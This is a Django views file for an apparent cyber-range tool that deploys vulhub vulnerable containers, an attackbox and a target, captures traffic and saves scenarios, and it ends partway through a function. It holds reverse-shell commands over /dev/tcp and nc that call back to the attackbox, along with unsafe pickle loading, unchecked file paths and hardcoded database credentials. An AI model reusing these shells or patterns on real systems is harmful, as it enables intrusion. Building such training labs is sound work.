import re
import os
#import ast
import git
import sys
import time
import json
import stat
import yaml
import docker
import shutil
import socket
import psutil
import signal
import pickle
import binascii
import markdown
import psycopg2
import requests
import ipaddress
import subprocess
#import objectpath
import collections


import networkx as nx
import multiprocessing as mp
import plotly.graph_objects as go

from .forms import *
from .models import *
from .custom_containers import *
from markdown_view.views import *

from mysql.connector import connect, Error

from django.http import HttpResponse
from django.shortcuts import redirect,render
from django.contrib.auth import login,logout,authenticate

#from threading import Thread

class scenario_template:
    def __init__(self, name):

        self.name = name
        self.selected_vulns = []
        self.selected_vulns_child_containers = dict()
        self.selected_custom_containers = []
        self.targetos="targetos:172.18.0.200"
        self.attackbox="attackbox:172.18.0.157"
        self.current_external_ip = "172.18.0.11"
        self.current_internal_ip = "172.19.0.11"
        self.number_of_internal_containers = 0
        self.aux_containers_env = dict()
        self.added_containers = dict()
        self.assigned_containers = dict()
        self.container_logs_to_recover = ["attackbox"]
        self.connected_containers = [(self.attackbox,self.targetos)]
        self.container_nodes = []
        self.tshark_process_pid = 0
        self.listen_process_pid = 0
        self.dockerfile_to_edit = ""
        self.suggested_tag = ""
        self.selected_container = ""

current_scenario = scenario_template("current")

loaded_scenario = scenario_template("loaded")

dbs_list = ["mysql", "postgres"]

cve_string = ""

selected_vuln = ""
selected_cc = ""

dir_path = os.path.dirname(os.path.realpath(__file__))

resource_file_path = "{}resource_files".format(dir_path.split("GUI")[0])

vulnhub_dir = "{}/vulnhub".format(resource_file_path.split("GUI")[0])

pcap_file = "capture_{}.pcap".format(time.strftime("%d%m%Y"))

docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')

api_client = docker.APIClient(base_url='unix://var/run/docker.sock')

# https://cve.circl.lu/api/cve/


def home(request):

    return render(request,'GUI/home.html')


def vulnhubView(request):

    git_url = "https://github.com/vulhub/vulhub.git"

    if request.method == "POST":

        try:
            git.Repo(vulnhub_dir)
            g = git.cmd.Git(vulnhub_dir)
            g.pull()
        except git.InvalidGitRepositoryError:
            git.Repo.clone_from(git_url, vulnhub_dir)

        os.remove("{}/cve_cwe_mappings.json".format(dir_path))

        os.remove("{}/cwe_data.json".format(dir_path))

    cwe_dict = dict()

    cve_cwe_dict = dict()

    if os.path.isfile("{}/cve_cwe_mappings.json".format(dir_path)):

        with open("{}/cve_cwe_mappings.json".format(dir_path), 'r') as fp:
            cve_cwe_dict = json.load(fp)

    else:

        if os.path.isfile("{}/cwe_data.json".format(dir_path)):

            cwe_json = json.loads(open("{}/cwe_data.json".format(dir_path), "r").read())
        
        else:

            cwe_r = requests.get("https://cve.circl.lu/api/cwe")

            with open("{}/cwe_data.json".format(dir_path), "w") as f:
                json.dump(cwe_r.json(), f)
            
            cwe_json = json.loads(open("{}/cwe_data.json".format(dir_path), "r").read())

        for i in cwe_json:
            cwe_dict[i["id"]] = i

        for root, dirs, files in os.walk(vulnuhb_dir):
            for dir in dirs:
                #if dir.lower().__contains__("cve"):
                match = re.search(r"CVE[-]\d*[-]\d*", dir)
                if match:
                    cve = match.group()
                    cve_r = requests.get("https://cve.circl.lu/api/cve/"+cve) 
                    try:
                        cwe = cve_r.json()["cwe"]
                        cwe_id = str(cwe.split("-")[1])
                    except:
                        cwe_id = "Misc"

                    if not re.search(r'\d', cwe_id):
                        cwe_id = "Misc"
                    else:
                        cwe_id = "{}:{}".format(cwe,cwe_dict[cwe_id]["name"])

                            
                    if cwe_id not in cve_cwe_dict:
                        cve_cwe_dict[cwe_id] = dict()
                    
                    vuln_dir_path = os.path.join(root,dir).replace("//","/")
                    temp = vuln_dir_path.split("vulnhub/")[1]
                    software = temp.split("/")[0]
                    cve_cwe_dict[cwe_id]["{}({})".format(cve,software)] = vuln_dir_path                

        with open("{}/cve_cwe_mappings.json".format(dir_path), 'w') as fp:
            json.dump(cve_cwe_dict, fp)
    
    context = {
        'vulnerabilities':collections.OrderedDict(sorted(cve_cwe_dict.items()))
    }

    return render(request,'GUI/vulnhub.html',context)


def customView(request):
    global current_scenario

    cc_dict = custom_containers

    if "selected_custom_containers" in request.POST:
        selected_ccs = request.POST.getlist("selected_custom_containers")
        for cc in selected_ccs:
            if cc not in current_scenario.selected_custom_containers:
                current_scenario.selected_custom_containers.append(cc)

    if "remove_custom_container" in request.POST:

        vulns_to_remove = request.POST.getlist("remove_custom_container")

        for vuln in vulns_to_remove:
            current_scenario.selected_custom_containers.remove(vuln)

    context = {
        'custom_containers':list(cc_dict.keys()),
        'selected_custom_containers':current_scenario.selected_custom_containers
    }

    return render(request,'GUI/custom.html',context)


def environmentView(request):
    global current_scenario

    if len(current_scenario.aux_containers_env) == 0:
        for key in aux_containers:
            current_scenario.aux_containers_env[key] = "Avaliable"

    if len(current_scenario.added_containers) == 0:
        for container in current_scenario.selected_vulns:
            container_vlun = container.split("vulnhub")[1]
            current_scenario.added_containers[container_vlun]="External"

            dcf_data = yaml_data_from_docker_compose(container_vlun)[0]

            for service in dcf_data["services"]: 
                current_scenario.selected_vulns_child_containers[service] = container_vlun
            
        for container in current_scenario.selected_custom_containers:
            current_scenario.added_containers[container]="External"

    if request.method == "POST":

        if "deploy" in request.POST:

            traffic_target = request.POST["traffic_target"]
            
            auto_attack_target = request.POST["auto_attack_target"]

            target_os = request.POST["target_os"]
            
            print("Deployment in Progress")

            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],traffic_target, auto_attack_target,target_os,replace_subnet_dict=None, user_defined=False)

            listen_cmd = "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1"
    
            if target_os.__contains__("alpine"):
                listen_cmd = "nc 172.18.0.157 4242 -e /bin/ash"
            
            listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os))
            
            listen_process.start()
            
            current_scenario.listen_process_pid = listen_process.pid

        if "end_deployment" in request.POST:
            pid_list = [current_scenario.tshark_process_pid,current_scenario.listen_process_pid]
            
            for pid in pid_list:
                p = psutil.Process(pid)
                p.terminate()

            output_fldr = "{}output_files/{}".format(dir_path.split("GUI")[0],time.strftime("%d-%m-%Y_%H%M"))

            log_clean_up(pcap_file,current_scenario.container_logs_to_recover,"logfiles",output_fldr)

        if "save_scenario" in request.POST:
            scenario_name=request.POST["save_scenario"]
            if scenario_name == "":
                scenario_name = "saved_scenario_{}".format(time.strftime("%d%m%Y"))

            current_scenario.name = scenario_name

            pkl_file = "{}/User_Defined_Scenarios/{}.pkl".format(resource_file_path,current_scenario.name)

            with open(pkl_file, 'wb') as pkl_dump:
                pickle.dump(current_scenario, pkl_dump, pickle.HIGHEST_PROTOCOL)
            

        if "internal_containers" in request.POST:
            changed_to_external = request.POST.getlist("internal_containers")

            for i in changed_to_external:
                current_scenario.added_containers[i] = "External"

        if "external_containers" in request.POST:
            changed_to_internal = request.POST.getlist("external_containers")


            for i in changed_to_internal:
                current_scenario.added_containers[i] = "Internal"

        if "avaliable_auxillary_containers" in request.POST:
            changed_to_selected = request.POST.getlist("avaliable_auxillary_containers")

            for i in changed_to_selected:
                current_scenario.aux_containers_env[i] = "Selected"
                current_scenario.added_containers[i]="External"

        if "selected_auxillary_containers" in request.POST:
            changed_to_avaliable = request.POST.getlist("selected_auxillary_containers")

            for i in changed_to_avaliable:
                current_scenario.aux_containers_env[i] = "Avaliable"
                del current_scenario.added_containers[i]

    external_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.added_containers.items() if v == "External"}.items()))

    internal_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.added_containers.items() if v == "Internal"}.items()))

    current_scenario.number_of_internal_containers = len(internal_containers)

    avaliable_auxillary_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.aux_containers_env.items() if v == "Avaliable"}.items()))

    selected_auxillary_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.aux_containers_env.items() if v == "Selected"}.items()))

    
    if current_scenario.number_of_internal_containers >= 1:
        # Getting both external and internal instances of targetos in nodes - Cleanup
        if current_scenario.targetos in current_scenario.container_nodes:
            current_scenario.container_nodes.remove(current_scenario.targetos)

        current_scenario.targetos="targetos:172.18.0.200/172.19.0.200"
        current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))
    
    else:
        if current_scenario.targetos in current_scenario.container_nodes:
            current_scenario.container_nodes.remove(current_scenario.targetos)

        current_scenario.targetos="targetos:172.18.0.200"
        current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))

    previous_container = ""

    for container in internal_containers:

        if container in current_scenario.selected_vulns_child_containers.values():
            child_containers = [k for k,v in current_scenario.selected_vulns_child_containers.items() if v == container]

            for child_container in child_containers:
                graph_container = "{} - {}".format(container, child_container)
                container_ip_str = container_to_graph(current_scenario, graph_container, "172.19.0.0/24")
        
        else:
            container_ip_str = container_to_graph(current_scenario, container, "172.19.0.0/24")

        if previous_container != container_ip_str and previous_container != "":
            current_scenario.connected_containers.append((previous_container, container_ip_str))

        previous_container = container_ip_str

    previous_container = ""

    for container in external_containers:

        if container in current_scenario.selected_vulns_child_containers.values():
            child_containers = [k for k,v in current_scenario.selected_vulns_child_containers.items() if v == container]

            for child_container in child_containers:
                graph_container = "{} - {}".format(container, child_container)
                container_ip_str = container_to_graph(current_scenario, graph_container, "172.18.0.0/24")
        
        else:
            container_ip_str = container_to_graph(current_scenario, container, "172.18.0.0/24")

        if previous_container != container_ip_str and previous_container != "":
            current_scenario.connected_containers.append((previous_container, container_ip_str))

        previous_container = container_ip_str

    tuples_to_remove = []

    # Tidy up changes to container arrangement 
    for tuple_item in current_scenario.connected_containers:
        remove_tuple = False
        for container in tuple_item:
            if container not in current_scenario.container_nodes:
                current_scenario.container_nodes.append(container)

            container_key_value = ""
            if re.match(r"[/]\w*[/]",container):
                container_key_value = container.split(" ")[0]
            else:
                container_key_value = container.split(":")[0]

            container_ip_value = container.split(":")[1]
            
            if container_key_value in avaliable_auxillary_containers.keys():
                current_scenario.container_nodes.remove(container)
                remove_tuple = True

            if container_key_value in external_containers.keys():
                if container_ip_value.__contains__("172.19"):
                    current_scenario.container_nodes.remove(container)
                    remove_tuple = True

            if container_key_value in internal_containers.keys():
                if container_ip_value.__contains__("172.18"):
                    current_scenario.container_nodes.remove(container)
                    remove_tuple = True

            if current_scenario.number_of_internal_containers >= 1:
                if container_key_value == "targetos" and container_ip_value == "172.18.0.200":
                    current_scenario.container_nodes.remove(container)
                    remove_tuple = True

            if current_scenario.number_of_internal_containers == 0:
                if container_key_value == "targetos" and container_ip_value == "172.18.0.200/172.19.0.200":
                    current_scenario.container_nodes.remove(container)
                    remove_tuple = True

        if remove_tuple:
            tuples_to_remove.append(tuple_item)

    for tuple_item in tuples_to_remove:
        current_scenario.connected_containers.remove(tuple_item)

    graph = create_Network_Graph(current_scenario.connected_containers,current_scenario.container_nodes)

    context = {
        'external_containers':external_containers,
        'internal_containers':internal_containers,
        'avaliable_auxillary_containers':avaliable_auxillary_containers,
        'selected_auxillary_containers':selected_auxillary_containers,
        'graph':graph
    }

    return render(request,'GUI/environment.html',context)


def userDefinedView(request):

    pkl_files = os.listdir("{}/User_Defined_Scenarios".format(resource_file_path))

    context = {
        'pkl_files':pkl_files
    }

    return render(request,'GUI/userDefined.html',context)


def userDefinedEnviromentView(request):
    global loaded_scenario

    running_container_info = "\n"

    if request.method == "POST":
        
        if loaded_scenario.name == "loaded":
            selected_scenario = request.POST["selected_scenario"]

            pkl_file = "{}/User_Defined_Scenarios/{}".format(resource_file_path,selected_scenario)

            with open(pkl_file, 'rb') as pkl_dump:
                loaded_scenario = pickle.load(pkl_dump)

        required_networks = ["uwe_tek_external_usd", "uwe_tek_internal_usd"]

        replace_subnet_dict = dict ()

        for req_network in required_networks:
            req_network_subnet = sub_network_check(req_network)
            replace_subnet = re.match(r"\d{1,3}.\d{1,3}",req_network_subnet)
            replace_subnet_dict[req_network] = replace_subnet.group()

        for i in range(0,len(loaded_scenario.connected_containers)):
            temp0 = loaded_scenario.connected_containers[i][0].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
            temp1 = loaded_scenario.connected_containers[i][1].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])

            loaded_scenario.connected_containers[i] = (temp0,temp1)

        for i in range(0,len(loaded_scenario.container_nodes)):
            loaded_scenario.container_nodes[i] = loaded_scenario.container_nodes[i].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])

        graph = create_Network_Graph(loaded_scenario.connected_containers,loaded_scenario.container_nodes)

        if "deploy" in request.POST:

            print("Deployment in Progress")

            traffic_target = request.POST["traffic_target"]
            
            auto_attack_target = request.POST["auto_attack_target"]

            target_os = request.POST["target_os"]
            
            deploy_containers(loaded_scenario, required_networks,traffic_target, auto_attack_target,target_os, replace_subnet_dict, user_defined=True)

            listen_cmd = "/bin/bash -i >& /dev/tcp/172.20.0.157/4242 0>&1"
    
            if target_os.__contains__("alpine"):
                listen_cmd = "nc 172.20.0.157 4242 -e /bin/ash"
            
            listen_process = mp.Process(target=listen,args=("0.0.0.0",18201,listen_cmd,target_os))
            
            listen_process.start()
            
            loaded_scenario.listen_process_pid = listen_process.pid

        if "end_deployment" in request.POST:
            pid_list = [loaded_scenario.tshark_process_pid,loaded_scenario.listen_process_pid]
            
            for pid in pid_list:
                p = psutil.Process(pid)
                p.terminate()
            
            output_fldr = "{}output_files/{}_{}".format(dir_path.split("GUI")[0],loaded_scenario.name,time.strftime("%d-%m-%Y_%H%M"))

            for i in range(0,len(loaded_scenario.container_logs_to_recover)):
                loaded_scenario.container_logs_to_recover[i] = "{}_{}".format(loaded_scenario.name, loaded_scenario.container_logs_to_recover[i].lower())

            log_clean_up("{}_{}".format(loaded_scenario.name,pcap_file),loaded_scenario.container_logs_to_recover,"logfiles/{}".format(loaded_scenario.name),output_fldr)

    context = {
        'graph':graph
    }

    return render(request,'GUI/userDefinedEnvironment.html',context)


def cveView(request):
    global current_scenario
    global selected_vuln
    global cve_string

    if "selected_cves" in request.POST:

        cve_string = request.POST["selected_cves"]

    if cve_string == "All":

        selected_cve_types = "All CVEs"

        with open("{}/cve_cwe_mappings.json".format(dir_path), 'r') as fp:
            cve_cwe_dict = json.load(fp)

        selected_cves = dict()

        for k, v in cve_cwe_dict.items():
            selected_cves.update(v)

    else:

        splt_string = cve_string.split("+")

        selected_cve_types = splt_string[0].strip()

        selected_cves = json.loads(splt_string[1].strip().replace("'","\""))


    if "vuln_path" in request.POST:

        if len(current_scenario.selected_vulns) == 0:

            current_scenario.selected_vulns = request.POST.getlist("vuln_path")

        else:
            temp = request.POST.getlist("vuln_path")
            for vuln in temp:
                if vuln not in current_scenario.selected_vulns:
                    current_scenario.selected_vulns.append(vuln)

    if "remove_vuln" in request.POST:

        vulns_to_remove = request.POST.getlist("remove_vuln")

        for vuln in vulns_to_remove:
            current_scenario.selected_vulns.remove("{}/vulnhub{}".format(resource_file_path,vuln))

    if "selected_vuln" in request.POST:

        if selected_vuln not in current_scenario.selected_vulns:
            current_scenario.selected_vulns.append(selected_vuln)
    
    pp_selected_vulns = []

    for vuln in current_scenario.selected_vulns:
        pp_selected_vulns.append(vuln.split("vulnhub")[1])

    context = {
        'selected_cve_types':selected_cve_types,
        'selected_cves':selected_cves,
        'selected_vulns':pp_selected_vulns
    }

    return render(request,'GUI/cveList.html',context)    


def readmeView(request):
    global selected_vuln

    selected_vuln = request.POST["vuln_path"]

    readme_file = os.path.join(selected_vuln,"README.md")

    readme_str = ""

    with open(readme_file, 'r') as readme_f:
        for line in readme_f:
            readme_str += line

    files = os.listdir(selected_vuln)
        
    htmlmarkdown=markdown.markdown(readme_str)

    docker_files=dict()

    for f in files:
        # Django static file jiggery pokery required here
        if os.path.splitext(f)[1] in (".jpg", ".gif", ".png"):
            src=os.path.join(selected_vuln,f)
            dst="{}/{}/static/{}".format(selected_vuln.split("resource_files")[0],"GUI",f)
            shutil.copyfile(src, dst)
            htmlmarkdown = htmlmarkdown.replace(f,os.path.join("/static/",f))

            # nicely format the markdown images
            htmlmarkdown = htmlmarkdown.replace('<img ','<img class="card-img-top ')

        if f.lower().__contains__("docker"):
            docker_files[f.split(".")[0]]=f
    
    context = {
        'htmlmarkdown':htmlmarkdown,
        'docker_files':docker_files
    }

    return render(request, 'GUI/readme.html', context)


def customReadmeView(request):
    global selected_cc

    selected_cc = request.POST["selected_custom_containers"]

    cc_dir = "{}/Custom_Containers/{}".format(resource_file_path,selected_cc)

    readme_file = os.path.join(cc_dir, "README.md")

    readme_str = ""

    with open(readme_file, 'r') as readme_f:
        for line in readme_f:
            readme_str += line
        
    htmlmarkdown=markdown.markdown(readme_str)

    docker_files=dict()

    files = os.listdir(cc_dir)

    for f in files:
        if f.lower().__contains__(selected_cc):
            docker_files[f.split(".")[0]]=f
    
    context = {
        'htmlmarkdown':htmlmarkdown,
        'docker_files':docker_files,
        'selected_cc':selected_cc
    }

    return render(request, 'GUI/customReadme.html', context)


def dockerfileView(request):
    global selected_vuln

    selected_file = request.POST["selected_file"]

    docker_file = os.path.join(selected_vuln, selected_file)

    docker_f = open(docker_file, 'r')

    context = {
        'selected_file':docker_f.read()
    }

    return render(request, 'GUI/dockerfileView.html', context)


def customDockerfileView(request):
    global selected_cc

    cc_dir = "{}/Custom_Containers/{}".format(resource_file_path,selected_cc)

    selected_file = request.POST["selected_file"]

    docker_file = os.path.join(cc_dir, selected_file)

    docker_f = open(docker_file, 'r')

    context = {
        'selected_file':docker_f.read()
    }

    return render(request, 'GUI/dockerfileView.html', context)


def dockerfileEditingView(request):
    global current_scenario

    suggested_tag = "container:{}".format(time.strftime("%d%m%Y"))

    saved_in_location = ""
   
    pp_containers = dict()

    docker_compose_file = ""

    docker_build_result = ""

    docker_file = "#No dockerfile selected or exists"

    for container in current_scenario.selected_vulns:
        pp_containers[container.split("vulnhub")[1]] = container
    
    #for container in current_scenario.selected_custom_containers:
    #    pp_containers[container] = os.path.join(resource_file_path,"Custom_Containers/{}".format(container))
    
    if request.method == "POST":

        if "selected_container" in request.POST:
            dockerfile_path = request.POST["selected_container"]

            container = [k for k,v in pp_containers.items() if dockerfile_path == v][0]

            current_scenario.selected_container = container

            files = os.listdir(dockerfile_path)

            for f in files:
                print(f)
                if f.lower().__contains__("dockerfile"):
                    with open(os.path.join(dockerfile_path,f)) as d_file:
                        docker_file = "#Dockerfile loaded from {}\n".format(dockerfile_path)
                        docker_file += d_file.read()

                if f.lower().__contains__("compose"):
                    with open(os.path.join(dockerfile_path,f)) as dc_file:
                        docker_compose_file = "{} - Docker Compose file\n".format(container)
                        docker_compose_file += dc_file.read()

            suggested_tag = suggested_tag.replace("container",container.replace("/","_")[1:])
            current_scenario.suggested_tag = suggested_tag

        if "file_to_edit" in request.POST:

            file_path_safe_container = current_scenario.selected_container.replace("/","_")[1:]

            new_container_path = os.path.join(resource_file_path,"Custom_Containers", file_path_safe_container)

            old_container_path = "{}/{}".format(vulnhub_dir,current_scenario.selected_container)

            if not os.path.isdir(new_container_path):
                os.makedirs(new_container_path) 

            file_data = request.POST["file_to_edit"]

            with open(os.path.join(new_container_path,"dockerfile"), "w") as new_dockerfile:
                new_dockerfile.write(file_data)

            shutil.copytree(old_container_path, new_container_path, dirs_exist_ok=True)

            #with open (os.path.join(resource_file_path,"Custom_Containers/user_defined_containers.json")) as json_dump_file:

            saved_in_location = "A copy of {} has been moved to {} - Complete with the edited dockerfile".format(current_scenario.selected_container, new_container_path)

            if "save_and_build" in request.POST:

                tag = request.POST["build_tag"]

                if tag == "":
                    tag = current_scenario.suggested_tag

                try:
                    for line in api_client.build(path=new_container_path, rm=True, tag="django_cve-2019-14234:01122022"):
                        print(line)
                except Exception as e:
                    docker_build_result = str(e)
                
                if docker_build_result == "":
                    docker_build_result = ""

    context = {
        'containers':pp_containers,
        'docker_compose_file': docker_compose_file,
        'file_contents':docker_file,
        'suggested_tag': suggested_tag,
        'saved_in':saved_in_location,
        'docker_build_result':docker_build_result

    }
    
    return render(request, 'GUI/dockerfileEditing.html', context)



def local_docker_check(image):
    try:
        docker_client.images.get(image)
    except docker.errors.ImageNotFound:#
        print("{} not found locally - Pulling image".format(image))
        docker_client.images.pull(image)

        print("{} saved locally".format(image))

    return


def container_check(container_name, status_to_check=None):

	try:
		container = docker_client.containers.get(container_name)
		status = container.status
	except:
		return "removed"

	if status_to_check is not None:
		while status != status_to_check:
			time.sleep(5)
			status = container.status

	return status


def service_check(address):

    # Check the service status - Container may be running while microservice is still setting up
    response_status = 404

    while response_status != 200:
        try:
            response = requests.get(address)
        # If container/ service is "running" but not yet setup we get a connection error
        except:
            continue

        response_status = response.status_code

    return 


def deploy_containers(scenario, required_networks,traffic_target, auto_attack_target,target_os, replace_subnet_dict, user_defined):

    running_container_info = "\n"

    for dbs in dbs_list:
        if dbs in scenario.assigned_containers.keys():
            dbc = custom_containers[dbs]
            running_container_info += custom_container_setup(dbc[0],dbc[1],dbc[2],dbc[3])

    for req_network in required_networks:
        req_network_subnet = sub_network_check(req_network)

    for custom_container in scenario.assigned_containers:
        if custom_container in dbs_list:
            continue

        if custom_container in aux_containers.keys():
            selected_dict = aux_containers
        
        if custom_container in custom_containers.keys():
            selected_dict = custom_containers

        if re.match(r"[/]\w*[/]",custom_container):
            parent_container = custom_container.split(" ")[0]
            if "{}{}".format(vulnhub_dir,parent_container) in scenario.selected_vulns:
                running_container_info += docker_compose_container_setup(scenario,parent_container)
                continue

        sc = selected_dict[custom_container]

        container_update=sc[0]

        original_ipv4 = container_update.ipv4_addr
        container_update.ipv4_addr = scenario.assigned_containers[custom_container]
        if user_defined:
            container_update.ipv4_addr = container_update.ipv4_addr.replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])

        if container_update.svc_check != None:
            original_svc_check = container_update.svc_check
            container_update.svc_check = original_svc_check.replace(original_ipv4,container_update.ipv4_addr)

        for i in range(0, len(sc[2])):
            if original_ipv4 in sc[2][i]:
                sc[2][i] = sc[2][i].replace(original_ipv4,container_update.ipv4_addr)
                if user_defined:
                    sc[2][i] = sc[2][i].replace("uwe_tek_external","uwe_tek_external_usd").replace("uwe_tek_internal","uwe_tek_internal_usd")

        #custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):

        if custom_container == "random_traffic":
            container_update.command = traffic_target
            
        if custom_container == "auto_attack":

            scenario.container_logs_to_recover.append("auto_attack")

            cmd_args = auto_attack_target.split(" ")
            container_update.command = "-target {} -scanners {}".format(cmd_args[0],cmd_args[1])

        if user_defined:
            for i in range(0, len(sc[2])):
                sc[2][i] = sc[2][i].replace("--name {}".format(container_update.name), "--name {}_{}".format(scenario.name,container_update.name))

            container_update.name = "{}_{}".format(scenario.name,container_update.name)

        running_container_info += custom_container_setup(sc[0],sc[1],sc[2],sc[3])

    # Done last to avoid polluting logs with setup connections etc
    target_os_container_name = ""
    for k, v in required_containers.items():
        container_update=v[0]

        if k == "target":
            
            container_update.image = "dh157/goibhniu:{}".format(target_os)

        if user_defined:
            if container_update.ipv4_addr != None:
                container_update.ipv4_addr = container_update.ipv4_addr.replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])

            for i in range(0, len(v[2])):
                v[2][i] = v[2][i].replace("--name {}".format(container_update.name), "--name {}_{}  --hostname {}_{}".format(scenario.name,container_update.name,scenario.name,container_update.name))

                if not os.path.isdir("{}/logfiles/{}".format(resource_file_path,scenario.name)):
                    os.makedirs("{}/logfiles/{}".format(resource_file_path,scenario.name))

                v[2][i] = v[2][i].replace("logfiles","logfiles/{}".format(scenario.name))

            container_update.name = "{}_{}".format(scenario.name,container_update.name)

        running_container_info += custom_container_setup(v[0],v[1],v[2],v[3])

        if k == "target":
            if target_os.__contains__("ubuntu"):
                cmd_create = api_client.exec_create(container_update.name, "/usr/sbin/sshd", user="root")
        
                cmd_execute = api_client.exec_start(cmd_create, detach=True)

            if scenario.number_of_internal_containers >= 1:
                if user_defined:
                    docker_client.networks.get("uwe_tek_internal_usd").connect(container_update.name,ipv4_address="{}.0.200".format(replace_subnet_dict["uwe_tek_internal_usd"]))
                else:
                    docker_client.networks.get("uwe_tek_internal").connect(container_update.name,ipv4_address="172.19.0.200")

        if k == "attackbox":
            # Testing something - but does also fix an issue with patator - So keeping until I fix the image
            cmd_create = api_client.exec_create(container_update.name, 'sed -i "s/fp.setopt(pycurl.RESOLVE/#fp.setopt(pycurl.RESOLVE/g" /usr/bin/patator')
            
            cmd_execute = api_client.exec_start(cmd_create, detach=True)


    cleanup_set = set(running_container_info.replace("None", "").split("\n"))

    print("----------------------------------------------------------------")
    for string in cleanup_set:
        print(string)
    print("----------------------------------------------------------------")
    

    if user_defined:

        capture_output = "{}/{}_{}".format(resource_file_path,scenario.name,pcap_file)

        os.umask(0)
    
        if not os.path.exists(capture_output):
            os.mknod(capture_output, mode = 0o666)

        # TODO: Add in toggle / switch for this

        tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'dst', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"])],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        #tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'dst', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.10'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.11'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.12'.format(replace_subnet_dict["uwe_tek_external_usd"])],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    else:

        capture_output = "{}/{}".format(resource_file_path,pcap_file)

        os.umask(0)
    
        if not os.path.exists(capture_output):
            os.mknod(capture_output, mode = 0o666)

        tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/15', 'and', 'dst', 'net', '172.18.0.0/15'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
        
        #tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/15', 'and', 'dst', 'net', '172.18.0.0/15', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    scenario.tshark_process_pid = tshark_process.pid


def docker_compose_container_setup(scenario,container):
    
    running_container_info = ""

    dcf_data = yaml_data_from_docker_compose(container)[0]
    original_docker_compose_file = yaml_data_from_docker_compose(container)[1]

    dcf_dir_path = os.path.dirname(original_docker_compose_file)
    dcf_filename = os.path.basename(original_docker_compose_file)

    dcf_original_data = copy.copy(dcf_data)

    # Avoid overwrite of original in loop
    if not os.path.isfile(os.path.join(dcf_dir_path, "dcf_original.yml")):
        shutil.copy2(original_docker_compose_file,os.path.join(dcf_dir_path, "dcf_original.yml"))

    for service in dcf_data["services"]:

        temp = "{} - {}".format(container,service)
        
        ipv4_addr = scenario.assigned_containers[temp]

        running_container_info += "{} is up and running and can be accessed on {}\n".format(temp,ipv4_addr)

        dcf_data["services"][service]["networks"] = {"network":{"ipv4_address":ipv4_addr}}

        dcf_data["networks"] = {"network":{"name":"uwe_tek_external"}}

    with open(original_docker_compose_file,'w') as dcf_edited:
        yaml.safe_dump(dcf_data, dcf_edited)

    docker_compose_cmd = "docker compose --project-directory {} up -d".format(dcf_dir_path)

    subprocess.run(['bash', '-c', docker_compose_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    os.remove(original_docker_compose_file)

    os.rename(os.path.join(dcf_dir_path, "dcf_original.yml"), original_docker_compose_file)

    return running_container_info


def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
    network_list = api_client.networks()

    if container_check(Container.name) != "running":

        local_docker_check(Container.image)

        if len(subprocess_list) >= 2:

            subprocess_type = subprocess_list[0]
            subprocess_cmd = subprocess_list[1]

            if subprocess_type == "run":
                subprocess.run(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

            if subprocess_type == "popen":
                subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        if use_sdk:
            container = docker_client.containers.create(Container.image,
            detach=True, 
            name=Container.name,
            user=Container.run_as_user,
            command=Container.command, 
            environment=Container.environment,
            volumes=Container.volumes,
            cap_add=Container.capabilities)

            for network in network_list:
                if network["Name"].__contains__("uwe"):
                    network_subnet = network["IPAM"]["Config"][0]["Subnet"]
                    if ipaddress.IPv4Address(Container.ipv4_addr) in ipaddress.ip_network(network_subnet):
                        network_name = network["Name"]
			
            docker_client.networks.get(network_name).connect(Container.name,ipv4_address=Container.ipv4_addr)

            container.start()

        container_status = ""

        # Wait for container(s) to come online
        while container_status != "running":
            time.sleep(5)
            container_status = container_check(Container.name)
        
        if Container.name.lower() in dbs_list:
            no_connection = True
            # DBS connection check
            while no_connection:
                time.sleep(5)
                if Container.name.lower() == "mysql":
                    try:
                        with connect(
                            host=Container.ipv4_addr,
                            user="test",
                            password="ing",
                        ) as connection:
                            break
                    except Error as e:
                        print(str(e))
                        if "Access denied for user" in str(e):
